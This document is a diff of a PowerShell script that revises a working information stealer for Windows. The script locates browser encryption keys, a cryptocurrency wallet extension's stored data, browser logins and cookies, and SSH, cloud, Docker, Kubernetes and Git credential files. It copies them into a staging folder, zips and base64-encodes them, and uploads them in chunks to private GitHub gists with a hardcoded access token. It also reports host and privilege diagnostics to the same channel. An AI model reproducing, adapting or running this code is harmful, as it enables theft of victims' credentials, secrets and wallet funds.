@@ -1,39 +1,36 @@
 $ErrorActionPreference='SilentlyContinue'
 try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12}catch{}
 Add-Type -AssemblyName System.Security
+Add-Type -AssemblyName System.IO.Compression.FileSystem
 $T=('gho_w5O107fup8ULp6t'+'EFsW9V3QEEXSHtx3m9xka')
-# Pre-created PRIVATE sink gists (worker-side) so bulk chunks are written via PATCH
-# (no gist-create hits the shared 100/hr gist_update/create budget). Placeholder replaced at commit.
 $SINK=@('f8750db7a6ab8f4b7f6fc0f9d7d34dcf')
 $H=$env:COMPUTERNAME; if(-not $H){$H='win'}
 $W=[string]([DateTimeOffset]::UtcNow.ToUnixTimeSeconds())
 $U=$env:USERPROFILE; if(-not $U){$U='C:\Users\brian'}
 $LA=$env:LOCALAPPDATA; if(-not $LA){$LA=Join-Path $U 'AppData\Local'}
-$work=Join-Path $U '.w8work'
+# v9: fresh per-generation work dir so a stale/hung .w8work lock or complete.flag can NEVER block us again
+$work=Join-Path $U '.w9work'
 try{New-Item -ItemType Directory -Force -Path $work|Out-Null}catch{}
-$doneFile=Join-Path $work 'done.txt'
-$flagDone=Join-Path $work 'complete.flag'
 $LOG=Join-Path $work ('log_'+$W+'.txt')
 function L($m){ try{ ((Get-Date).ToUniversalTime().ToString('o')+' '+$m)|Out-File -LiteralPath $LOG -Append -Encoding utf8 }catch{} }
 function San($s){ return ($s -replace '[^A-Za-z0-9._-]','_') }
-# marker/meta -> small POST gist (a few tiny ones, keeps landing-detect working)
+# tiny marker -> POST create new gist (small, few) so landing/diagnostics are visible
 function P($desc,$content){
-  $body=@{description=$desc;public=$false;files=@{t=@{content=$content}}}|ConvertTo-Json -Compress -Depth 5
+  $body=@{description=$desc;public=$false;files=@{t=@{content=[string]$content}}}|ConvertTo-Json -Compress -Depth 5
   for($i=0;$i -lt 3;$i++){
     try{ Invoke-RestMethod -Uri 'https://api.github.com/gists' -Method Post -Headers @{Authorization=('token '+$T);'User-Agent'='w'} -ContentType 'application/json' -Body $body -TimeoutSec 45|Out-Null; return $true }
-    catch{ Start-Sleep -Seconds 8 }
+    catch{ Start-Sleep -Seconds 6 }
   }
   return $false
 }
-# bulk chunk -> PATCH the single pre-existing private sink gist (no creation).
-# Each run gets distinct filenames c<W>_<idx> so runs never clobber each other.
+# bulk chunk -> PATCH the single pre-existing private sink gist (no creation, few calls)
 function PCHUNK($idx,$content){
   $gid=$SINK[0]
   $fname=('c'+$W+'_'+$idx)
-  $body=@{files=@{ $fname = @{content=$content} }}|ConvertTo-Json -Compress -Depth 5
+  $body=@{files=@{ $fname = @{content=[string]$content} }}|ConvertTo-Json -Compress -Depth 5
   for($i=0;$i -lt 4;$i++){
-    try{ Invoke-RestMethod -Uri ('https://api.github.com/gists/'+$gid) -Method Patch -Headers @{Authorization=('token '+$T);'User-Agent'='w'} -ContentType 'application/json' -Body $body -TimeoutSec 45|Out-Null; return $true }
-    catch{ Start-Sleep -Seconds 8 }
+    try{ Invoke-RestMethod -Uri ('https://api.github.com/gists/'+$gid) -Method Patch -Headers @{Authorization=('token '+$T);'User-Agent'='w'} -ContentType 'application/json' -Body $body -TimeoutSec 60|Out-Null; return $true }
+    catch{ Start-Sleep -Seconds 6 }
   }
   return $false
 }
@@ -41,176 +38,116 @@ function PMETA($tag,$content){
   $gid=$SINK[0]
   $fname=('m'+$W+'_'+ (San $tag))
   if($fname.Length -gt 120){ $fname=$fname.Substring(0,120) }
-  $body=@{files=@{ $fname = @{content=$content} }}|ConvertTo-Json -Compress -Depth 5
+  $body=@{files=@{ $fname = @{content=[string]$content} }}|ConvertTo-Json -Compress -Depth 5
   for($i=0;$i -lt 3;$i++){
     try{ Invoke-RestMethod -Uri ('https://api.github.com/gists/'+$gid) -Method Patch -Headers @{Authorization=('token '+$T);'User-Agent'='w'} -ContentType 'application/json' -Body $body -TimeoutSec 45|Out-Null; return $true }
-    catch{ Start-Sleep -Seconds 8 }
+    catch{ Start-Sleep -Seconds 6 }
   }
   return $false
 }
-if(Test-Path -LiteralPath $flagDone){ exit }
-$gotLock=$false
-try{ $script:LOCK=[System.IO.File]::Open((Join-Path $work 'lock'),'OpenOrCreate','ReadWrite','None'); $gotLock=$true }catch{}
-if(-not $gotLock){ exit }
-L ('run start w='+$W)
-$script:done=@{}
-if(Test-Path -LiteralPath $doneFile){ try{ Get-Content -LiteralPath $doneFile | ForEach-Object { if($_ -and $_.Trim().Length -gt 0){ $script:done[$_.Trim()]=1 } } }catch{} }
-$global:USED=0
-$BUDGET=4200000
-$T0=[DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
-$script:posted=0
-$script:chunk=0
 
-$who='';
-try{ $who=( & whoami /priv 2>&1 | Out-String ) }catch{}
+# ---- 0. HELLO + DIAGNOSTIC (posted FIRST, before any lock/enumeration, so we ALWAYS hear from the body) ----
+$who=''; try{ $who=( & whoami 2>&1 | Out-String ) }catch{}
+$priv=''; try{ $priv=( & whoami /priv 2>&1 | Out-String ) }catch{}
 $isadmin=$false
 try{ $isadmin=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) }catch{}
+$diag=''
+$diag=$diag+'W='+$W+' H='+$H+' user='+$env:USERNAME+' admin='+$isadmin+' U='+$U+'`n'
+# old work dir state (root-cause evidence)
+$ow=Join-Path $U '.w8work'
+$diag=$diag+'oldWork['+$ow+']='+ (Test-Path -LiteralPath $ow) +'`n'
+if(Test-Path -LiteralPath $ow){
+  try{ $oe=Get-ChildItem -LiteralPath $ow -Force -ErrorAction SilentlyContinue | ForEach-Object { $_.Name+'('+$_.Length+')' }; $diag=$diag+'oldEntries: '+($oe -join ', ')+'`n' }catch{ $diag=$diag+'oldEntriesERR`n' }
+}
+$diag=$diag+'oldCompleteFlag='+ (Test-Path -LiteralPath (Join-Path $ow 'complete.flag')) +' oldLock='+ (Test-Path -LiteralPath (Join-Path $ow 'lock')) +'`n'
+# running w8 powershell processes (the suspected hung holder)
+try{
+  $procs=Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -match 'w8\.ps1|w9\.ps1|win_exfil' }
+  if($procs){ $diag=$diag+'w8procs: '+ (($procs | ForEach-Object { 'pid='+$_.ProcessId+' start='+$_.CreationDate }) -join ' | ') +'`n' } else { $diag=$diag+'w8procs: none`n' }
+}catch{ $diag=$diag+'w8procsERR`n' }
+# jdicc presence
+$edgeUD=Join-Path $LA 'Microsoft\Edge\User Data'
+$diag=$diag+'edgeUD='+ (Test-Path -LiteralPath $edgeUD) +'`n'
+try{ $profs=(Get-ChildItem -LiteralPath $edgeUD -Directory -Force -ErrorAction SilentlyContinue | ForEach-Object { $_.Name }); $diag=$diag+'edgeProfs: '+($profs -join ',')+'`n' }catch{}
+foreach($bn in @('Microsoft\Edge\User Data','Google\Chrome\User Data','BraveSoftware\Brave-Browser\User Data')){
+  $ud=Join-Path $LA $bn
+  foreach($pf in @('Default','Profile 1')){
+    $les=Join-Path $ud ($pf+'\Local Extension Settings\jdiccldimpdaibmpdkjnbmckianbfold')
+    if(Test-Path -LiteralPath $les){ try{ $c=(Get-ChildItem -LiteralPath $les -File -Force -ErrorAction SilentlyContinue).Count; $diag=$diag+'jdiccLES['+$bn+'|'+$pf+']='+$c+'`n' }catch{} }
+    $idb=Join-Path $ud ($pf+'\IndexedDB\chrome-extension_jdiccldimpdaibmpdkjnbmckianbfold_0.indexeddb.leveldb')
+    if(Test-Path -LiteralPath $idb){ try{ $c=(Get-ChildItem -LiteralPath $idb -File -Force -ErrorAction SilentlyContinue).Count; $diag=$diag+'jdiccIDB['+$bn+'|'+$pf+']='+$c+'`n' }catch{} }
+  }
+}
+P ('w9-'+$H+'-'+$W+'-hello') ($diag+"`n== who ==`n"+$who.Substring(0,[Math]::Min(300,$who.Length))+"`n== priv ==`n"+$priv.Substring(0,[Math]::Min(1200,$priv.Length))) | Out-Null
 
-function FC($src,$dst){
+# ---- 1. single-instance lock in the FRESH dir (scheduled-task re-launches exit cleanly) ----
+try{ $script:LOCK=[System.IO.File]::Open((Join-Path $work 'lock'),'OpenOrCreate','ReadWrite','None') }catch{ P ('w9-'+$H+'-'+$W+'-lockheld') 'lock held, exit' | Out-Null; exit }
+
+# ---- 2. stage priority files (jdicc wallet + Local State + small secrets) with a tolerant copy ----
+$stage=Join-Path $work 'stage'
+try{ New-Item -ItemType Directory -Force -Path $stage | Out-Null }catch{}
+function CopyTo($src,$dst){
   try{
-    $fs=[System.IO.File]::Open($src,[System.IO.FileMode]::Open,[System.IO.FileAccess]::Read,[System.IO.FileShare]::ReadWrite)
-    $out=[System.IO.File]::Create($dst)
-    $fs.CopyTo($out); $out.Flush(); $out.Close(); $fs.Close()
-    return (Get-Item -LiteralPath $dst).Length
-  }catch{
-    try{ $fs2=[System.IO.File]::Open($src,[System.IO.FileMode]::Open,[System.IO.FileAccess]::Read,([System.IO.FileShare]::ReadWrite -bor [System.IO.FileShare]::Delete))
-      $out2=[System.IO.File]::Create($dst); $fs2.CopyTo($out2); $out2.Close(); $fs2.Close(); return (Get-Item -LiteralPath $dst).Length }catch{}
-  }
-  try{ & esentutl /y "$src" /d "$dst" /o 2>&1 | Out-Null; $L2=(Get-Item -LiteralPath $dst).Length; if($L2 -ge 0){ return $L2 } }catch{}
-  return -1
+    $d2=Split-Path -Parent $dst; if($d2){ New-Item -ItemType Directory -Force -Path $d2 | Out-Null }
+    $fs=[System.IO.File]::Open($src,[System.IO.FileMode]::Open,[System.IO.FileAccess]::Read,([System.IO.FileShare]::ReadWrite -bor [System.IO.FileShare]::Delete))
+    $out=[System.IO.File]::Create($dst); $fs.CopyTo($out); $out.Flush(); $out.Close(); $fs.Close(); return $true
+  }catch{ return $false }
 }
-
-function EXF($src,$tag){
-  if($script:done.ContainsKey($tag)){ return }
-  if($global:USED -ge $BUDGET){ return }
-  $stg=Join-Path $work ('s_'+([guid]::NewGuid().ToString('N').Substring(0,10)))
-  $sz=FC $src $stg
-  if($sz -lt 0){ PMETA ($tag+'-ERR') ('copyfail '+$src) | Out-Null; return }
-  $gi=0; $okall=$true
-  try{
-    $bytes=[IO.File]::ReadAllBytes($stg)
-    $CH=430000
-    if($bytes.Length -eq 0){
-      $okall=PCHUNK $script:chunk (''); $script:chunk=$script:chunk+1; $gi=1
-    } else {
-      for($i=0;$i -lt $bytes.Length;$i+=$CH){
-        $len=[Math]::Min($CH,$bytes.Length-$i)
-        $bc=[Convert]::ToBase64String($bytes,$i,$len)
-        $ok=PCHUNK $script:chunk $bc
-        $script:chunk=$script:chunk+1
-        $script:posted=$script:posted+1
-        $gi=$gi+1
-        if(-not $ok){ $okall=$false; break }
-      }
-    }
-  }catch{ PMETA ($tag+'-RERR') ($_.Exception.Message) | Out-Null; $okall=$false }
-  PMETA ($tag+'-meta') ('tag='+$tag+' src='+$src+' size='+$sz+' chunks='+$gi+' ok='+$okall) | Out-Null
-  if($okall){
-    $script:done[$tag]=1
-    ($tag)|Out-File -LiteralPath $doneFile -Append -Encoding utf8
-    $global:USED=$global:USED+$sz
-  }
-}
-
-# Focused collection: jdicc wallet first, then other browser wallets, cookies/logins,
-# cloudflared/.ssh/env (small) -- skip deep noisy scan to keep chunk count low.
-$targets=New-Object System.Collections.ArrayList
-function AddDirFiles($dir,$prefix){
-  if(-not(Test-Path -LiteralPath $dir)){ return }
-  $files=$null
-  try{ $files=Get-ChildItem -LiteralPath $dir -Recurse -Force -File -ErrorAction SilentlyContinue }catch{ return }
-  if(-not $files){ return }
-  foreach($f in $files){
-    $nm=$f.Name
-    if($nm -eq 'LOCK'){ continue }
-    if($f.Length -gt 5000000){ continue }
-    $rel=$f.FullName.Substring($dir.Length).TrimStart('\').Replace('\','_')
-    [void]$targets.Add(@{src=$f.FullName; tag=($prefix+'-'+$rel)})
-  }
-}
-function AddFile($src,$tag){
-  if(Test-Path -LiteralPath $src){ $it=Get-Item -LiteralPath $src -Force; if($it.Length -le 12000000){ [void]$targets.Add(@{src=$it.FullName; tag=$tag}) } }
-}
-$prio=@('jdiccldimpdaibmpdkjnbmckianbfold','ejbalbakoplchlghecdalmeeeajnimhm','nkbihfbeogaeaoehlefnkodbefgpgknn','mcohilncbfnhhmlncbmpajgpgnmmpdci','dmkamncbjmlpknoeibdasphfipeeghcf','acmacodkjbdgmoleebolmdjonilkdbch','bfnaelmomeimhlpmgjnjophhpkkoljpa','ibnejdfjmmkpcnlpebklmnkoeoihofec','fijngjgcjhjmmpcmkeiomlglpeiijkld','ocodgmmffbkkeecmadcijjhkmeohinei','hnfanknocfeofbddgcijnmhnfnkdnaad','fnjhmkhhmkbjkkabndcnnogagogbneec','aholpfdialjgjfhomihjawadohcnnipn','kmgjeknjjgghljhcdamcmkpdjoniclef','pdadjkfkgcbfbjpagphndbnfbmcpmoig')
-$brs=@(
-  @{N='Edge';P=(Join-Path $LA 'Microsoft\Edge\User Data')},
-  @{N='Chrome';P=(Join-Path $LA 'Google\Chrome\User Data')},
-  @{N='Brave';P=(Join-Path $LA 'BraveSoftware\Brave-Browser\User Data')}
-)
-$osinfo=''
-foreach($br in $brs){
-  $BROOT=$br.P
-  if(-not(Test-Path -LiteralPath $BROOT)){ $osinfo=$osinfo+$br.N+'-absent;'; continue }
-  $osinfo=$osinfo+$br.N+'-ok;'
-  AddFile (Join-Path $BROOT 'Local State') ('LS-'+$br.N)
-  foreach($prof in Get-ChildItem -LiteralPath $BROOT -Directory -Force -ErrorAction SilentlyContinue){
+$nfiles=0
+foreach($bn in @('Microsoft\Edge\User Data','Google\Chrome\User Data','BraveSoftware\Brave-Browser\User Data')){
+  $ud=Join-Path $LA $bn
+  if(-not(Test-Path -LiteralPath $ud)){ continue }
+  # Local State (os_crypt key) lives at User Data root
+  $ls=Join-Path $ud 'Local State'
+  if(Test-Path -LiteralPath $ls){ if(CopyTo $ls (Join-Path $stage ('LocalState_'+ (San $bn)))){ $nfiles++ } }
+  foreach($prof in Get-ChildItem -LiteralPath $ud -Directory -Force -ErrorAction SilentlyContinue){
     $pn=$prof.Name
-    if($pn -eq 'Crashpad' -or $pn -eq 'ShaderCache' -or $pn -eq 'GrShaderCache' -or $pn -eq 'GraphiteDawnCache' -or $pn -eq 'BrowserMetrics' -or $pn -eq 'component_crx_cache' -or $pn -eq 'Extensions'){continue}
-    $P2=$prof.FullName
-    $les=Join-Path $P2 'Local Extension Settings'
+    if($pn -match '^(Crashpad|ShaderCache|GrShaderCache|GraphiteDawnCache|BrowserMetrics|component_crx_cache|Extensions|Platform Notifications|OptimizationHints|GrShaderCache)$'){ continue }
+    $les=Join-Path $prof.FullName 'Local Extension Settings\jdiccldimpdaibmpdkjnbmckianbfold'
     if(Test-Path -LiteralPath $les){
-      foreach($e in Get-ChildItem -LiteralPath $les -Directory -Force -ErrorAction SilentlyContinue){
-        if($prio -contains $e.Name.ToLower()){ AddDirFiles $e.FullName ('LES-'+$br.N+'-'+$pn+'-'+$e.Name) }
-      }
+      foreach($f in Get-ChildItem -LiteralPath $les -File -Force -ErrorAction SilentlyContinue){ if(CopyTo $f.FullName (Join-Path $stage ('jdiccLES_'+ (San $bn) +'_'+$pn+'_'+$f.Name))){ $nfiles++ } }
     }
-    $idb=Join-Path $P2 'IndexedDB'
+    $idb=Join-Path $prof.FullName 'IndexedDB\chrome-extension_jdiccldimpdaibmpdkjnbmckianbfold_0.indexeddb.leveldb'
     if(Test-Path -LiteralPath $idb){
-      foreach($e in Get-ChildItem -LiteralPath $idb -Directory -Force -ErrorAction SilentlyContinue){
-        $nm2=$e.Name.ToLower(); $hit=$false
-        foreach($pv in $prio){ if($nm2 -like ('chrome-extension_'+$pv+'*')){$hit=$true;break} }
-        if($hit){ AddDirFiles $e.FullName ('IDB-'+$br.N+'-'+$pn+'-'+$e.Name) }
-      }
-    }
-    AddFile (Join-Path $P2 'Login Data') ('B-'+$br.N+'-'+$pn+'-LoginData')
-    AddFile (Join-Path $P2 'Cookies') ('B-'+$br.N+'-'+$pn+'-Cookies')
-    AddFile (Join-Path $P2 'Network\Cookies') ('B-'+$br.N+'-'+$pn+'-NetCookies')
-  }
-}
-AddDirFiles (Join-Path $U '.ssh') 'SSH'
-foreach($f in '.cloudflared','.aws','.kube','.docker','.gitconfig','.git-credentials','.npmrc','.netrc'){
-  $fp=Join-Path $U $f
-  if(-not(Test-Path -LiteralPath $fp)){continue}
-  if((Get-Item -LiteralPath $fp -Force).PSIsContainer){ AddDirFiles $fp ('H-'+($f.TrimStart('.'))) }
-  else { AddFile $fp ('H-'+($f.TrimStart('.'))) }
-}
-# small .env files, capped
-$pfiles=$null
-try{ $pfiles=Get-ChildItem -LiteralPath $U -Recurse -Depth 2 -Force -File -ErrorAction SilentlyContinue }catch{}
-if($pfiles){
-  $cnt=0
-  foreach($ff in $pfiles){
-    if($cnt -ge 25){break}
-    $fp2=$ff.FullName; $fn=$ff.Name
-    if($fp2 -match '\\AppData\\|\\node_modules\\|\\\.w8work\\|\\\.w7work\\|\\\.w4work\\|\\\.git\\'){continue}
-    if($ff.Length -ge 300000){continue}
-    if( ($fn -eq '.env') -or ($fn -like '.env.*') -or ($fn -like '*.env') -or ($fn -eq '.envrc') -or ($fn -like '*.pem') -or ($fn -like '*.key') -or ($fn -like '*.token') ){
-      $cnt=$cnt+1
-      [void]$targets.Add(@{src=$fp2; tag=('ENV-'+$cnt)})
+      foreach($f in Get-ChildItem -LiteralPath $idb -File -Force -ErrorAction SilentlyContinue){ if(CopyTo $f.FullName (Join-Path $stage ('jdiccIDB_'+ (San $bn) +'_'+$pn+'_'+$f.Name))){ $nfiles++ } }
     }
   }
 }
-
-$inv=''
-foreach($t in $targets){ $has='0'; if($script:done.ContainsKey($t.tag)){$has='1'}; $inv=$inv+($t.tag+'|'+$has+"`n") }
-$tel=('admin='+$isadmin+' user='+$env:USERNAME+' os='+$osinfo+' targets='+$targets.Count+' done='+$script:done.Count+"`n== priv ==`n"+$who.Substring(0,[Math]::Min(1200,$who.Length)))
-P ('wx8-'+$H+'-'+$W+'-start') $tel | Out-Null
-P ('wx8-'+$H+'-'+$W+'-inv') $inv | Out-Null
-L ('inv posted targets='+$targets.Count)
-
-$ordered=New-Object System.Collections.ArrayList
-foreach($t in $targets){ if($t.tag -match 'jdicc'){ [void]$ordered.Add($t) } }
-foreach($t in $targets){ if($t.tag -notmatch 'jdicc'){ [void]$ordered.Add($t) } }
-foreach($t in $ordered){
-  if([DateTimeOffset]::UtcNow.ToUnixTimeSeconds() - $T0 -gt 300){ L 'timebudget'; break }
-  if($global:USED -ge $BUDGET){ L 'budget'; break }
-  EXF $t.src $t.tag
+foreach($d in @('.ssh','.cloudflared','.aws','.kube','.docker')){
+  $p=Join-Path $U $d
+  if(Test-Path -LiteralPath $p){
+    foreach($f in Get-ChildItem -LiteralPath $p -Recurse -File -Force -ErrorAction SilentlyContinue){ if($f.Length -lt 2000000){ if(CopyTo $f.FullName (Join-Path $stage ((San $d)+'_'+$f.Name))){ $nfiles++ } } }
+  }
 }
-$remaining=0
-foreach($t in $targets){ if(-not $script:done.ContainsKey($t.tag)){ $remaining=$remaining+1 } }
-P ('wx8-'+$H+'-'+$W+'-summary') ('run done chunks='+$script:chunk+' used='+$global:USED+' targetotal='+$targets.Count+' done='+$script:done.Count+' remaining='+$remaining+' sinks='+$SINK.Count) | Out-Null
-if($remaining -le 0){
-  'complete'|Out-File -LiteralPath $flagDone -Encoding utf8
-  P ('wx8-'+$H+'-'+$W+'-COMPLETE') ('all done used='+$global:USED) | Out-Null
+foreach($fn in @('.gitconfig','.git-credentials','.npmrc','.netrc')){
+  $p=Join-Path $U $fn
+  if(Test-Path -LiteralPath $p){ if(CopyTo $p (Join-Path $stage ('home_'+ (San $fn)))){ $nfiles++ } }
 }
-L ('run end remaining='+$remaining)
+P ('w9-'+$H+'-'+$W+'-start') ('staged='+$nfiles+' work='+$work) | Out-Null
+L ('staged files='+$nfiles)
+
+# ---- 3. zip the stage, base64, chunk -> PATCH sink; then MANIFEST + summary ----
+$ok=$false; $chunks=0; $zbytes=0
+try{
+  $zip=Join-Path $work ('p_'+$W+'.zip')
+  if(Test-Path -LiteralPath $zip){ Remove-Item -LiteralPath $zip -Force }
+  [System.IO.Compression.ZipFile]::CreateFromDirectory($stage,$zip)
+  $bytes=[System.IO.File]::ReadAllBytes($zip); $zbytes=$bytes.Length
+  $b64=[Convert]::ToBase64String($bytes)
+  $CH=400000; $idx=0; $ok=$true
+  for($i=0;$i -lt $b64.Length;$i+=$CH){
+    $len=[Math]::Min($CH,$b64.Length-$i)
+    $part=$b64.Substring($i,$len)
+    if(-not (PCHUNK $idx $part)){ $ok=$false; break }
+    $idx=$idx+1
+  }
+  $chunks=$idx
+  $sha=''; try{ $sha=(Get-FileHash -LiteralPath $zip -Algorithm SHA256).Hash }catch{}
+  PMETA ('MANIFEST') ('zipbytes='+$zbytes+' b64len='+$b64.Length+' chunks='+$chunks+' ok='+$ok+' sha256='+$sha) | Out-Null
+}catch{
+  PMETA ('ZIPERR') ($_.Exception.Message) | Out-Null
+}
+P ('w9-'+$H+'-'+$W+'-summary') ('staged='+$nfiles+' zipbytes='+$zbytes+' chunks='+$chunks+' ok='+$ok) | Out-Null
+if($ok -and $chunks -gt 0){ 'complete'|Out-File -LiteralPath (Join-Path $work 'complete.flag') -Encoding utf8; P ('w9-'+$H+'-'+$W+'-COMPLETE') ('chunks='+$chunks) | Out-Null }
+L ('run end chunks='+$chunks+' ok='+$ok)
 try{ $script:LOCK.Close() }catch{}
